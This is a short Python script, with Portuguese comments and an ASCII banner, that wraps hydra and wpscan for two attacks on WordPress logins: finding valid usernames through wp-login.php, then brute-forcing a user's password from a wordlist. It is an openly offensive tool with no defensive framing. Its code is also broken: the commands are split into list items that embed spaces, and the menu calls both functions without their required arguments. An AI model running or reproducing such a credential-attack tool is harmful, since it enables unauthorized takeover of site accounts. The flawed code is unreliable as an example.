import os
import subprocess
def executar_comando(comando):
    """
    Executa um comando shell e retorna a saída.
    comando: lista ou string contendo o comando.
    """
    try:
        if isinstance(comando, str):
            resultado = subprocess.run(
                comando,
                shell=True,               # Executa via shell
                capture_output=True,      # Captura stdout e stderr
                text=True,                 # Retorna como string
                check=True                 # Levanta exceção se erro
            )
        else:
            resultado = subprocess.run(
                comando,
                capture_output=True,
                text=True,
                check=True
            )

        print("Saída:", resultado.stdout.strip())
        if resultado.stderr:
            print("Erros:", resultado.stderr.strip())

    except subprocess.CalledProcessError as e:
        print(f"Erro ao executar comando: {e}")
    except Exception as e:
        print(f"Falha inesperada: {e}")

def enumerate_users(user_list, target):
    executar_comando(["hydra -L ",user_list," -p test ", target," http-post-form '/wp-login.php:log=^USER^&pwd=^PWD^:Invalid username' -t 30"])

def bruteforce_password(user, password_list, target):
    executar_comando(["wpscan --url http://", target, "/ -U ", user, " -P ", password_list])


def main():

    print("""
                                                                                             
                                                             ,--.                            
    ,---,.    ,---,           ,---,.    ,---,              ,--.'|  ,----..      ,---,        
  ,'  .'  \  '  .' \        ,'  .'  \  '  .' \         ,--,:  : | /   /   \    '  .' \       
,---.' .' | /  ;    '.    ,---.' .' | /  ;    '.    ,`--.'`|  ' :|   :     :  /  ;    '.     
|   |  |: |:  :       \   |   |  |: |:  :       \   |   :  :  | |.   |  ;. / :  :       \    
:   :  :  /:  |   /\   \  :   :  :  /:  |   /\   \  :   |   \ | :.   ; /--`  :  |   /\   \   
:   |    ; |  :  ' ;.   : :   |    ; |  :  ' ;.   : |   : '  '; |;   | ;  __ |  :  ' ;.   :  
|   :     \|  |  ;/  \   \|   :     \|  |  ;/  \   \'   ' ;.    ;|   : |.' .'|  |  ;/  \   \ 
|   |   . |'  :  | \  \ ,'|   |   . |'  :  | \  \ ,'|   | | \   |.   | '_.' :'  :  | \  \ ,' 
'   :  '; ||  |  '  '--'  '   :  '; ||  |  '  '--'  '   : |  ; .''   ; : \  ||  |  '  '--'   
|   |  | ; |  :  :        |   |  | ; |  :  :        |   | '`--'  '   | '/  .'|  :  :         
|   :   /  |  | ,'        |   :   /  |  | ,'        '   : |      |   :    /  |  | ,'         
|   | ,'   `--''          |   | ,'   `--''          ;   |.'       \   \ .'   `--''           
`----'                    `----'                    '---'          `---`                     
                                                                                             

    """)
    actions = {
            "1": enumerate_users,
            "2": bruteforce_password,
    }
    print(actions)

    
    while True:
        choice = input("\nSelecione uma opção: ").strip()
        if choice == "3":
            print("[*] Ate mais... BAZINGA!")
            break
        elif choice in actions:
            print()
            actions[choice]()
        else:
            print("[!] Opção inválida")

main()